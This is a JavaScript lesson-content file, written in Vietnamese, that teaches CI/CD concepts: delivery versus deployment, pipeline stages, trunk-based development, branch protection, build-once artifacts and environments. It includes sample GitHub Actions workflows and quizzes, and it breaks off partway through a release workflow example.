/* Nội dung bài học chương p08 */
window.LESSON_CONTENT = window.LESSON_CONTENT || {};
Object.assign(window.LESSON_CONTENT, {
  "p08.m0.t0": {
    sections: [
      {
        h: "Ba khái niệm hay bị nhầm",
        p: [
          "CI (Continuous Integration) là thói quen tích hợp code vào nhánh chính thường xuyên, mỗi lần tích hợp đều được build và test tự động. Mục tiêu là phát hiện lỗi sớm, khi thay đổi còn nhỏ và người viết còn nhớ mình vừa làm gì.",
          "Continuous Delivery nghĩa là sau CI, mọi commit trên nhánh chính đều ở trạng thái có thể phát hành. Artifact đã được build, test, deploy thử lên staging. Việc đưa lên production chỉ cần một cú bấm hoặc một lần duyệt.",
          "Continuous Deployment đi thêm một bước: không còn bước duyệt tay. Commit nào qua hết các cổng kiểm tra tự động sẽ tự lên production. Cả hai cách viết tắt đều là CD, nên khi ai đó nói CD, bạn nên hỏi lại họ đang nói Delivery hay Deployment."
        ]
      },
      {
        h: "Vì sao cần CI/CD",
        p: [
          "Không có CI, mỗi người làm trên nhánh riêng nhiều tuần, đến lúc merge thì xung đột lớn và lỗi tích tụ. Không có CD, việc release là sự kiện căng thẳng, làm bằng tay theo checklist, dễ sót bước và khó lặp lại.",
          "CI/CD biến release thành việc nhàm chán: nhỏ, thường xuyên, tự động, có thể rollback. Thay đổi càng nhỏ thì càng dễ review, dễ tìm nguyên nhân khi lỗi và rủi ro mỗi lần deploy càng thấp."
        ],
        list: [
          "CI: mỗi PR và mỗi push đều chạy lint, test, build.",
          "Continuous Delivery: main luôn deploy được; production cần người duyệt.",
          "Continuous Deployment: main xanh là tự lên production, cần test và giám sát rất tốt."
        ]
      },
      {
        h: "Ví dụ: cùng một pipeline, khác ở cổng duyệt",
        p: [
          "Trong GitHub Actions, khác biệt giữa Delivery và Deployment thường chỉ nằm ở cấu hình environment. Nếu environment `production` có Required reviewers, pipeline dừng lại chờ duyệt (Delivery). Bỏ quy tắc đó thì pipeline chạy thẳng tới production (Deployment)."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test

  deploy-production:
    if: github.event_name == 'push'
    needs: test
    runs-on: ubuntu-latest
    # Có Required reviewers trên environment này = Continuous Delivery
    # Không có = Continuous Deployment
    environment: production
    steps:
      - run: echo "Deploy \${{ github.sha }}"`
        }
      },
      {
        h: "Nên chọn cái nào",
        p: [
          "Hầu hết đội nên bắt đầu với CI thật tốt rồi tiến tới Continuous Delivery. Continuous Deployment chỉ an toàn khi bạn có test tự động đáng tin cậy, giám sát và cảnh báo tốt, có feature flag và rollback nhanh. Ở các lĩnh vực có quy định chặt như ngân hàng, bước duyệt tay thường là yêu cầu bắt buộc, nên Continuous Delivery là điểm dừng hợp lý."
        ]
      }
    ],
    summary: [
      "CI: tích hợp code thường xuyên, mỗi lần đều build và test tự động.",
      "Continuous Delivery: mọi commit trên main luôn sẵn sàng release, production cần một bước duyệt.",
      "Continuous Deployment: bỏ bước duyệt, qua hết kiểm tra tự động là lên production.",
      "Thay đổi nhỏ và thường xuyên giúp giảm rủi ro mỗi lần deploy."
    ],
    pitfalls: [
      "Gọi một job build chạy mỗi đêm là CI: nếu developer vẫn giữ nhánh riêng nhiều tuần thì đó không phải tích hợp liên tục.",
      "Bật Continuous Deployment khi test còn mỏng và chưa có giám sát: lỗi lên production nhanh hơn chứ không an toàn hơn.",
      "Để pipeline đỏ nhiều ngày mà vẫn merge: khi đó main không còn ở trạng thái release được."
    ],
    quiz: [
      {
        q: "Điểm khác biệt chính giữa Continuous Delivery và Continuous Deployment là gì?",
        options: ["Delivery không chạy test", "Deployment tự động đưa lên production mà không cần bước duyệt tay", "Delivery chỉ dùng cho mobile", "Deployment không cần build artifact"],
        answer: 1,
        explain: "Cả hai đều build, test và giữ main ở trạng thái release được. Khác biệt là Deployment bỏ bước duyệt tay trước production. Các đáp án còn lại mô tả sai cả hai khái niệm."
      },
      {
        q: "Mục tiêu cốt lõi của CI là gì?",
        options: ["Deploy lên production mỗi giờ", "Phát hiện lỗi tích hợp sớm bằng cách merge thường xuyên và test tự động", "Thay thế code review", "Giảm số lượng test"],
        answer: 1,
        explain: "CI giúp phát hiện lỗi khi thay đổi còn nhỏ. CI không thay code review, không bắt buộc deploy production và càng không giảm test."
      },
      {
        q: "Trong GitHub Actions, cách phổ biến để biến pipeline thành Continuous Delivery là gì?",
        options: ["Xoá job deploy", "Đặt Required reviewers cho environment production", "Chạy workflow bằng schedule", "Dùng matrix build"],
        answer: 1,
        explain: "Required reviewers khiến job dùng environment production phải chờ người duyệt. Schedule và matrix không liên quan tới cổng duyệt; xoá job deploy thì không còn CD."
      }
    ]
  },
  "p08.m0.t1": {
    sections: [
      {
        h: "Pipeline là dây chuyền các cổng kiểm tra",
        p: [
          "Pipeline là chuỗi bước tự động biến một commit thành phần mềm chạy trên production. Mỗi stage là một cổng: nếu thất bại, commit dừng lại ở đó và không đi tiếp. Nguyên tắc sắp xếp là bước nhanh, rẻ chạy trước; bước chậm, tốn kém chạy sau. Như vậy phần lớn lỗi được báo trong vài phút đầu."
        ],
        list: [
          "Lint & type-check: vài chục giây, bắt lỗi cú pháp và kiểu.",
          "Unit test và integration test: bắt lỗi logic, thường có database thật qua service container.",
          "Build: tạo artifact, thường là Docker image gắn tag theo commit SHA.",
          "Scan: quét lỗ hổng dependency và image (SCA, Trivy), có thể chặn nếu có lỗi CRITICAL.",
          "Publish artifact: đẩy image lên registry (GHCR, ECR).",
          "Deploy staging rồi chạy smoke test hoặc e2e test.",
          "Deploy production (có thể cần duyệt), sau đó verify bằng health check và metric."
        ]
      },
      {
        h: "Ví dụ khung pipeline với needs",
        p: [
          "Trong GitHub Actions, thứ tự stage được tạo bằng `needs`. Các job không phụ thuộc nhau chạy song song, ví dụ lint và test. Job `image` chỉ chạy khi cả hai xanh."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/pipeline.yml",
          src: `name: Pipeline
on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with: { node-version: 24, cache: npm }
      - run: npm ci && npm run lint && npm run typecheck

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with: { node-version: 24, cache: npm }
      - run: npm ci && npm test

  image:
    needs: [lint, test]
    runs-on: ubuntu-latest
    steps:
      - run: echo "build, scan, push image theo SHA"

  deploy-staging:
    needs: image
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: echo "deploy + smoke test"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo "deploy + verify"`
        }
      },
      {
        h: "Đánh đổi: tốc độ và độ an toàn",
        p: [
          "Pipeline càng nhiều cổng thì càng an toàn nhưng càng chậm. Một mốc tham khảo phổ biến là phản hồi cho PR nên trong khoảng 10 phút, vì lâu hơn thì developer chuyển sang việc khác và mất tập trung. Bạn có thể giữ tốc độ bằng cách chạy song song, cache dependency, và tách những bước rất chậm (DAST, e2e đầy đủ) ra chạy trên staging hoặc theo lịch.",
          "Stage Verify thường bị bỏ quên. Deploy xong chưa có nghĩa là thành công: cần gọi health check, xem tỷ lệ lỗi và độ trễ trong vài phút đầu, và có đường rollback tự động nếu chỉ số xấu đi."
        ]
      },
      {
        h: "Pipeline cho PR khác pipeline cho main",
        p: [
          "Không phải stage nào cũng chạy ở mọi sự kiện. Với pull request, pipeline chạy lint, test, build image (không push) và scan để trả lời câu hỏi: thay đổi này có an toàn để merge không. Với push lên main, pipeline chạy đầy đủ: build, scan, publish, deploy staging, deploy production.",
          "Cách làm phổ biến là dùng điều kiện `if: github.event_name == 'push'` cho các job publish và deploy, như ví dụ Lab 03. PR từ fork không nhận secret, nên mọi bước cần secret phải nằm ở pipeline của main."
        ]
      }
    ],
    summary: [
      "Pipeline là chuỗi cổng: lint, test, build, scan, publish, deploy staging, test, deploy production, verify.",
      "Bước nhanh và rẻ chạy trước để báo lỗi sớm.",
      "Dùng `needs` để tạo thứ tự, các job độc lập chạy song song.",
      "Scan phải chạy trước khi publish; verify sau deploy là bắt buộc."
    ],
    pitfalls: [
      "Push image lên registry rồi mới scan: image lỗi đã nằm sẵn trên registry và có thể bị deploy nhầm.",
      "Dồn mọi thứ vào một job dài 40 phút: lỗi lint cũng phải chờ cả pipeline mới biết.",
      "Coi deploy xong là xong, không có smoke test hay theo dõi metric sau deploy."
    ],
    quiz: [
      {
        q: "Vì sao lint và type-check thường được đặt ở đầu pipeline?",
        options: ["Vì chúng bắt buộc chạy trên production", "Vì chúng nhanh, rẻ và bắt được nhiều lỗi sớm", "Vì chúng tạo ra Docker image", "Vì GitHub yêu cầu như vậy"],
        answer: 1,
        explain: "Nguyên tắc là fail fast: bước nhanh chạy trước để phản hồi sớm. Lint không tạo image và không có quy định nào của GitHub buộc thứ tự này."
      },
      {
        q: "Scan image nên đặt ở đâu so với bước push lên registry?",
        options: ["Sau khi push", "Trước khi push", "Chỉ chạy trên production", "Không cần scan nếu test đã xanh"],
        answer: 1,
        explain: "Scan trước khi push để image có lỗ hổng nghiêm trọng không bao giờ lên registry. Test xanh không nói gì về CVE trong base image."
      },
      {
        q: "Trong GitHub Actions, từ khoá nào tạo phụ thuộc giữa các job?",
        options: ["depends_on", "after", "needs", "stage"],
        answer: 2,
        explain: "`needs` khai báo job phải chờ job khác thành công. `depends_on` là của Docker Compose, `stage` là khái niệm của GitLab CI."
      }
    ]
  },
  "p08.m0.t2": {
    sections: [
      {
        h: "Trunk-based development là gì",
        p: [
          "Trunk-based development là cách làm việc mà mọi người tích hợp code vào một nhánh chính (trunk, thường là `main`) nhiều lần mỗi ngày. Nhánh tính năng nếu có thì sống rất ngắn, thường dưới một đến hai ngày. Đây chính là điều kiện để CI đúng nghĩa: nếu không merge thường xuyên thì không có tích hợp liên tục.",
          "Trái ngược là mô hình nhánh sống dài như GitFlow với các nhánh develop, release, feature kéo dài nhiều tuần. Mô hình đó hợp với phần mềm phát hành theo phiên bản đóng gói, nhưng với dịch vụ web deploy liên tục, nó tạo ra merge lớn, xung đột nhiều và release chậm."
        ]
      },
      {
        h: "Làm sao merge khi tính năng chưa xong",
        p: [
          "Câu hỏi hay gặp nhất: tính năng cần hai tuần thì làm sao merge mỗi ngày? Câu trả lời là tách deploy khỏi release. Code chưa xong vẫn được merge và deploy, nhưng được ẩn sau feature flag đang tắt. Khi hoàn thiện, bạn bật flag cho một nhóm nhỏ rồi mở rộng dần."
        ],
        list: [
          "Feature flag: bọc code mới trong điều kiện bật/tắt.",
          "Branch by abstraction: tạo interface, làm bản cài đặt mới song song với bản cũ, chuyển dần rồi xoá bản cũ.",
          "Chia nhỏ PR: mỗi PR là một bước hoàn chỉnh, có test, không làm hỏng main."
        ],
        code: {
          lang: "typescript",
          file: "src/checkout/checkout.service.ts",
          src: `// Code mới đã nằm trên main nhưng chỉ chạy khi flag bật
async checkout(userId: string, cart: Cart) {
  const useNewFlow = await this.flags.getBooleanValue('new-checkout', false, {
    targetingKey: userId,
  });
  return useNewFlow ? this.checkoutV2(cart) : this.checkoutV1(cart);
}`
        }
      },
      {
        h: "Quy trình hằng ngày",
        p: [
          "Mỗi sáng bạn kéo main mới nhất, tạo nhánh ngắn, làm một thay đổi nhỏ, mở PR, CI chạy, đồng đội review, merge trong ngày. Nhờ PR nhỏ, review nhanh hơn và chất lượng review cao hơn. Với đội lớn, merge queue giúp đảm bảo mỗi PR được test trên phiên bản main mới nhất trước khi merge.",
          "Đánh đổi: trunk-based đòi hỏi kỷ luật cao. Test tự động phải tốt, CI phải nhanh, và mọi người phải chấp nhận commit code chưa hoàn thiện nhưng an toàn. Flag cũ phải được dọn dẹp, nếu không code sẽ đầy nhánh điều kiện chết."
        ]
      }
    ],
    summary: [
      "Mọi người merge vào main nhiều lần mỗi ngày, nhánh sống rất ngắn.",
      "Feature flag và branch by abstraction cho phép merge code chưa xong một cách an toàn.",
      "PR nhỏ giúp review nhanh, dễ tìm lỗi, rủi ro thấp.",
      "Cần CI nhanh, test tốt và thói quen dọn flag cũ."
    ],
    pitfalls: [
      "Gọi là trunk-based nhưng nhánh vẫn sống hai tuần: bạn vẫn gặp merge lớn như GitFlow.",
      "Merge code dở dang mà không có flag, làm hỏng tính năng đang chạy trên production.",
      "Không bao giờ xoá flag đã bật 100%: code thành mê cung điều kiện và khó test mọi tổ hợp."
    ],
    quiz: [
      {
        q: "Trong trunk-based development, nhánh tính năng thường sống bao lâu?",
        options: ["Vài tháng", "Đến khi release lớn tiếp theo", "Rất ngắn, thường dưới một đến hai ngày", "Không bao giờ được merge"],
        answer: 2,
        explain: "Nhánh ngắn là cốt lõi của trunk-based. Nhánh sống hàng tháng hoặc chờ release là đặc điểm của mô hình nhánh dài."
      },
      {
        q: "Làm sao merge tính năng chưa hoàn thiện vào main mà không ảnh hưởng người dùng?",
        options: ["Comment code lại", "Ẩn sau feature flag đang tắt", "Tắt CI cho PR đó", "Push thẳng lên main"],
        answer: 1,
        explain: "Feature flag cho phép code nằm trên main và được deploy nhưng không kích hoạt. Tắt CI hoặc push thẳng phá vỡ cổng kiểm tra; comment code thì code không được build và test."
      },
      {
        q: "Merge queue giải quyết vấn đề gì?",
        options: ["Tự viết test", "Đảm bảo PR được kiểm tra trên phiên bản main mới nhất trước khi merge", "Thay thế code review", "Giảm dung lượng repo"],
        answer: 1,
        explain: "Khi nhiều PR merge liên tục, một PR xanh trên main cũ vẫn có thể làm hỏng main mới. Merge queue test lại PR trên main mới nhất. Nó không viết test hay thay review."
      }
    ]
  },
  "p08.m0.t3": {
    sections: [
      {
        h: "Vì sao phải bảo vệ nhánh main",
        p: [
          "Nếu main là thứ luôn deploy được, thì không được để ai đẩy code chưa kiểm tra lên đó, kể cả admin. Branch protection (hoặc repository rulesets, cách cấu hình mới hơn của GitHub) buộc mọi thay đổi phải đi qua pull request, phải có CI xanh và có người review.",
          "Đây cũng là một biện pháp bảo mật: nếu tài khoản một developer bị chiếm, kẻ tấn công không thể lặng lẽ push mã độc lên main mà không có ai duyệt."
        ],
        list: [
          "Require a pull request before merging, tối thiểu 1 approval.",
          "Require status checks to pass: chọn đúng tên các job CI quan trọng.",
          "Require branches to be up to date hoặc dùng merge queue.",
          "Chặn force push và xoá nhánh.",
          "Require review from Code Owners cho những thư mục nhạy cảm.",
          "Không cho phép bypass, hoặc giới hạn người được bypass."
        ]
      },
      {
        h: "CODEOWNERS: đúng người review đúng chỗ",
        p: [
          "File `CODEOWNERS` gán người hoặc team chịu trách nhiệm cho từng đường dẫn. Khi PR chạm vào thư mục workflow hoặc hạ tầng, GitHub tự yêu cầu review từ team tương ứng. Thay đổi workflow CI rất nhạy cảm vì workflow có quyền truy cập secret, nên nên giao cho team platform."
        ],
        code: {
          lang: "text",
          file: ".github/CODEOWNERS",
          src: `# Dòng sau ghi đè dòng trước nếu cùng khớp
*                       @my-org/backend
/.github/workflows/     @my-org/platform
/infra/                 @my-org/platform
/prisma/migrations/     @my-org/backend-leads`
        }
      },
      {
        h: "Required checks và các bẫy",
        p: [
          "Required status check khớp theo tên check, với GitHub Actions thường là tên job. Nếu bạn đổi tên job mà không cập nhật rule, PR sẽ treo ở trạng thái chờ mãi. Nếu workflow bị bỏ qua do lọc `paths`, check bắt buộc cũng ở trạng thái chờ và PR không merge được.",
          "Nếu dùng merge queue, workflow CI phải lắng nghe thêm sự kiện `merge_group`, nếu không các check bắt buộc sẽ không bao giờ chạy trong hàng đợi."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `on:
  pull_request:
  merge_group:        # bắt buộc khi bật merge queue
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  test:               # tên này được chọn trong Required status checks
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm ci && npm test`
        }
      },
      {
        h: "Rulesets và bảo vệ tag",
        p: [
          "GitHub có hai cách cấu hình: branch protection rule cổ điển và repository rulesets mới hơn. Rulesets cho phép nhiều bộ quy tắc cùng áp dụng, nhắm tới nhiều nhánh hoặc tag theo mẫu, và có thể đặt ở cấp organization để mọi repo cùng tuân theo. Với repo mới, hãy ưu tiên rulesets.",
          "Đừng quên bảo vệ tag. Nếu workflow deploy production được kích hoạt bởi tag `v*`, thì ai tạo được tag là người đó deploy được. Một ruleset cho tag `v*` chỉ cho phép nhóm release tạo tag và cấm xoá hay di chuyển tag đã có."
        ]
      }
    ],
    summary: [
      "Không ai push thẳng lên main; mọi thay đổi đi qua PR.",
      "Required status checks đảm bảo CI xanh trước khi merge.",
      "CODEOWNERS buộc đúng team review các thư mục nhạy cảm như workflow và infra.",
      "Merge queue cần trigger `merge_group` trong workflow."
    ],
    pitfalls: [
      "Cho admin bypass rule: sự cố thường xảy ra đúng lúc vội và bypass.",
      "Đổi tên job CI nhưng quên cập nhật tên check bắt buộc, khiến mọi PR bị treo.",
      "Dùng `paths` filter cho workflow có check bắt buộc: PR không chạm path đó sẽ không merge được."
    ],
    quiz: [
      {
        q: "Required status check trong GitHub khớp với cái gì của GitHub Actions?",
        options: ["Tên file workflow", "Tên check, thường là tên job", "Tên nhánh", "Tên runner"],
        answer: 1,
        explain: "Rule chọn theo tên check mà job báo về. Tên file workflow, nhánh hay runner không phải là thứ được so khớp."
      },
      {
        q: "Vì sao nên dùng CODEOWNERS cho thư mục `.github/workflows/`?",
        options: ["Để workflow chạy nhanh hơn", "Vì workflow có quyền truy cập secret nên thay đổi cần team platform duyệt", "Để tắt CI", "Vì GitHub bắt buộc"],
        answer: 1,
        explain: "Sửa workflow có thể làm lộ secret hoặc bỏ qua các cổng kiểm tra, nên cần người có chuyên môn duyệt. CODEOWNERS không ảnh hưởng tốc độ và không bắt buộc."
      },
      {
        q: "Bạn bật merge queue nhưng PR trong hàng đợi không bao giờ có kết quả check. Nguyên nhân khả dĩ nhất?",
        options: ["Thiếu trigger `merge_group` trong workflow", "Thiếu `workflow_dispatch`", "Runner hết dung lượng", "Chưa tạo tag"],
        answer: 0,
        explain: "Merge queue tạo sự kiện `merge_group`; workflow không lắng nghe sự kiện này thì không chạy. Các lựa chọn khác không liên quan trực tiếp."
      }
    ]
  },
  "p08.m0.t4": {
    sections: [
      {
        h: "Nguyên tắc: build một lần, dùng lại khắp nơi",
        p: [
          "Build once, deploy many nghĩa là mỗi commit chỉ được build thành artifact đúng một lần. Artifact đó, thường là Docker image gắn tag theo commit SHA, được deploy lên staging, được test, rồi chính nó được đưa lên production. Không build lại cho từng môi trường.",
          "Lý do rất thực tế: mỗi lần build là một cơ hội để khác đi. Base image `node:24-alpine` có thể đã được cập nhật, một dependency có thể ra bản vá mới, cache có thể khác. Nếu production chạy một image được build lại, thì thứ bạn đã test trên staging không còn là thứ đang chạy trên production."
        ]
      },
      {
        h: "Config tách khỏi artifact",
        p: [
          "Để một image chạy được ở nhiều môi trường, mọi thứ khác nhau giữa môi trường phải nằm ngoài image: URL database, secret, mức log, feature flag mặc định. Chúng được truyền vào lúc chạy qua biến môi trường, ConfigMap, Secret hoặc secret manager. Đây là nguyên tắc config của 12-factor app.",
          "Không được có những thứ như `if (NODE_ENV === 'production')` để đổi URL gọi API cứng trong code, và cũng không được bake file `.env.production` vào image."
        ],
        list: [
          "Tag bằng commit SHA: bất biến, truy ngược được về code.",
          "Tốt hơn nữa là deploy theo digest (`@sha256:...`), vì tag có thể bị ghi đè còn digest thì không.",
          "Bật chế độ tag immutable trên registry (ECR hỗ trợ) để không ai ghi đè tag cũ."
        ]
      },
      {
        h: "Ví dụ: truyền cùng một tag qua các job",
        p: [
          "Job build xuất ra tag qua `outputs`. Job deploy staging và production nhận đúng tag đó. Không có bước `docker build` nào trong các job deploy."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `jobs:
  image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    outputs:
      tag: \${{ steps.vars.outputs.tag }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: vars
        run: echo "tag=\${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
      - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: true
          tags: ghcr.io/\${{ github.repository }}:\${{ steps.vars.outputs.tag }}

  deploy-staging:
    needs: image
    uses: ./.github/workflows/deploy.yml
    with:
      environment: staging
      image_tag: \${{ needs.image.outputs.tag }}

  deploy-production:
    needs: [image, deploy-staging]
    uses: ./.github/workflows/deploy.yml
    with:
      environment: production
      image_tag: \${{ needs.image.outputs.tag }}`
        }
      },
      {
        h: "Đánh đổi",
        p: [
          "Cách này đòi hỏi bạn thiết kế ứng dụng đọc config lúc khởi động, và đòi hỏi registry dùng chung giữa các môi trường hoặc có bước copy image giữa registry. Với frontend SPA, biến như URL API thường bị nhúng lúc build; giải pháp là nạp config runtime (ví dụ file `config.json` do server trả về) thay vì build riêng cho từng môi trường."
        ]
      }
    ],
    summary: [
      "Mỗi commit build đúng một artifact, dùng lại cho mọi môi trường.",
      "Tag image theo commit SHA, lý tưởng là deploy theo digest.",
      "Config khác nhau giữa môi trường truyền vào lúc chạy, không bake vào image.",
      "Thứ đã test trên staging chính là thứ chạy trên production."
    ],
    pitfalls: [
      "Build lại image cho production: có thể khác base image hoặc dependency so với bản đã test.",
      "Dùng tag `latest` để deploy: không biết đang chạy commit nào, rollback cũng không rõ về đâu.",
      "Nhúng secret hoặc URL môi trường vào image lúc build."
    ],
    quiz: [
      {
        q: "Vì sao không nên build lại image riêng cho production?",
        options: ["Vì tốn tiền runner", "Vì image mới có thể khác bản đã test (base image, dependency, cache)", "Vì registry không cho phép", "Vì Docker không hỗ trợ"],
        answer: 1,
        explain: "Lý do chính là đảm bảo thứ chạy trên production giống hệt thứ đã test. Chi phí runner là phụ; registry và Docker đều cho phép build lại."
      },
      {
        q: "Cách tham chiếu image nào đảm bảo bất biến tuyệt đối?",
        options: ["Tag `latest`", "Tag theo tên nhánh", "Digest `@sha256:...`", "Tag `stable`"],
        answer: 2,
        explain: "Digest là hash nội dung nên không thể trỏ sang image khác. Mọi tag đều có thể bị ghi đè trừ khi registry bật immutable tag."
      },
      {
        q: "Config khác nhau giữa staging và production nên được đưa vào như thế nào?",
        options: ["Build argument riêng cho mỗi môi trường", "Biến môi trường, ConfigMap hoặc secret manager lúc chạy", "Sửa code trước mỗi lần deploy", "Tạo nhánh riêng cho mỗi môi trường"],
        answer: 1,
        explain: "Truyền config lúc chạy giữ artifact giống nhau. Build argument riêng hay nhánh riêng đều dẫn tới artifact khác nhau cho mỗi môi trường."
      }
    ]
  },
  "p08.m0.t5": {
    sections: [
      {
        h: "Vai trò của từng môi trường",
        p: [
          "Môi trường là nơi ứng dụng chạy cùng cấu hình và dữ liệu riêng. Mỗi môi trường có mục đích khác nhau, và code đi qua chúng theo thứ tự từ ít rủi ro tới nhiều rủi ro."
        ],
        list: [
          "dev (hoặc local): developer tự chạy, thường bằng Docker Compose, dữ liệu giả.",
          "preview: môi trường tạm cho từng PR, reviewer và tester bấm thử được trước khi merge.",
          "staging: giống production nhất có thể, chạy đúng image sẽ lên production, dùng cho smoke test và e2e.",
          "production: người dùng thật, dữ liệu thật, quyền truy cập chặt nhất."
        ]
      },
      {
        h: "Environment parity",
        p: [
          "Parity là mức độ giống nhau giữa các môi trường. Staging khác production càng nhiều thì càng có lỗi chỉ xuất hiện trên production. Những khác biệt hay gây sự cố: phiên bản Postgres khác, staging không có CDN hoặc load balancer, staging chạy một replica nên không lộ lỗi race condition, cấu hình timeout khác.",
          "Cách đạt parity tốt nhất là dùng cùng mã hạ tầng (Terraform module, Helm chart) cho mọi môi trường, chỉ khác file biến như kích thước instance hay số replica. Staging nhỏ hơn thì được, nhưng phải cùng kiểu thành phần và cùng phiên bản."
        ]
      },
      {
        h: "Preview environment cho mỗi PR",
        p: [
          "Preview environment giúp review bằng cách dùng thật, không chỉ đọc code. Mỗi PR được deploy vào một namespace riêng như `pr-123` với URL riêng. Khi PR đóng, môi trường phải được xoá để không tốn tiền."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/preview.yml",
          src: `name: Preview
on:
  pull_request:
    types: [opened, synchronize, reopened, closed]

permissions:
  contents: read

concurrency:
  group: preview-\${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  deploy:
    if: github.event.action != 'closed'
    runs-on: ubuntu-latest
    environment:
      name: preview
      url: https://pr-\${{ github.event.pull_request.number }}.preview.example.com
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: ./scripts/deploy-preview.sh "pr-\${{ github.event.pull_request.number }}"

  cleanup:
    if: github.event.action == 'closed'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: ./scripts/destroy-preview.sh "pr-\${{ github.event.pull_request.number }}"`
        }
      },
      {
        h: "Đánh đổi",
        p: [
          "Preview environment tốn tài nguyên và cần xử lý database (seed dữ liệu mẫu hoặc database dùng chung cho preview). PR từ fork không nên được deploy tự động vì code lạ sẽ chạy với quyền của bạn. Nhiều đội chỉ bật preview cho PR có label nhất định để tiết kiệm."
        ]
      },
      {
        h: "Ánh xạ môi trường vào công cụ",
        p: [
          "Trong GitHub, mỗi môi trường tương ứng một GitHub Environment với secret, variable và quy tắc duyệt riêng. Trong Kubernetes, môi trường thường là namespace riêng, còn production nên nằm trên cluster riêng, lý tưởng là cả tài khoản cloud riêng, để một sai sót ở staging không thể chạm tới production.",
          "Quyền truy cập cũng tăng dần theo môi trường: developer có thể toàn quyền trên dev và preview, đọc được staging, còn production chỉ thay đổi qua pipeline."
        ]
      }
    ],
    summary: [
      "dev, preview, staging, production có mục đích và mức rủi ro tăng dần.",
      "Staging phải giống production về kiểu thành phần và phiên bản.",
      "Dùng cùng mã hạ tầng cho mọi môi trường, chỉ khác biến.",
      "Preview environment theo PR phải được dọn khi PR đóng."
    ],
    pitfalls: [
      "Staging dùng SQLite hoặc Postgres khác phiên bản production: lỗi migration chỉ lộ ra khi lên production.",
      "Quên xoá preview environment, hóa đơn cloud tăng dần theo số PR.",
      "Copy nguyên dữ liệu production về staging mà không ẩn danh, vi phạm bảo vệ dữ liệu cá nhân."
    ],
    quiz: [
      {
        q: "Environment parity nghĩa là gì?",
        options: ["Mọi môi trường có cùng số server", "Các môi trường giống nhau về thành phần, phiên bản và cách cấu hình", "Mọi môi trường dùng chung database", "Staging và production dùng cùng domain"],
        answer: 1,
        explain: "Parity là giống nhau về bản chất; quy mô có thể khác. Dùng chung database hay domain là sai và nguy hiểm."
      },
      {
        q: "Workflow preview cần xử lý sự kiện nào để dọn môi trường?",
        options: ["pull_request với types closed", "push lên main", "schedule", "release"],
        answer: 0,
        explain: "Khi PR đóng (merge hoặc không), sự kiện pull_request với action closed kích hoạt job dọn dẹp."
      },
      {
        q: "Vì sao không nên tự động deploy preview cho PR từ fork?",
        options: ["Vì fork không có code", "Vì code lạ sẽ chạy với quyền và hạ tầng của bạn", "Vì GitHub cấm", "Vì preview chỉ dành cho main"],
        answer: 1,
        explain: "Code từ fork chưa được tin cậy; deploy nó có thể giúp kẻ tấn công truy cập hạ tầng hoặc secret."
      }
    ]
  },
  "p08.m0.t6": {
    sections: [
      {
        h: "SemVer và Conventional Commits",
        p: [
          "SemVer (Semantic Versioning) dùng dạng `MAJOR.MINOR.PATCH`. Tăng MAJOR khi có thay đổi phá vỡ tương thích, MINOR khi thêm tính năng tương thích ngược, PATCH khi sửa lỗi. Nhìn số phiên bản, người dùng biết việc nâng cấp có an toàn không.",
          "Conventional Commits là quy ước viết commit message có cấu trúc, giúp máy đọc được ý nghĩa thay đổi. Khi kết hợp, công cụ có thể tự quyết định phiên bản tiếp theo, tự sinh changelog và tạo release."
        ],
        list: [
          "`fix: sửa lỗi phân trang` → tăng PATCH.",
          "`feat: thêm API xuất CSV` → tăng MINOR.",
          "`feat!: đổi định dạng response` hoặc footer `BREAKING CHANGE:` → tăng MAJOR.",
          "`chore:`, `docs:`, `test:`, `ci:` → mặc định không tạo release."
        ]
      },
      {
        h: "release-please và semantic-release",
        p: [
          "semantic-release chạy trên mỗi push vào main: phân tích commit từ tag gần nhất, tính version, tạo tag, GitHub Release và có thể publish package. Mọi thứ diễn ra ngay, không có bước người xem.",
          "release-please của Google theo cách khác: nó mở và cập nhật một Release PR chứa changelog và version mới. Khi bạn merge PR đó, tag và GitHub Release mới được tạo. Cách này cho đội một điểm kiểm soát là khi nào thì release."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/release.yml",
          src: `name: Release
on:
  push:
    branches: [main]

permissions:
  contents: write        # tạo tag và GitHub Release
  issues: write
  pull-requests: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
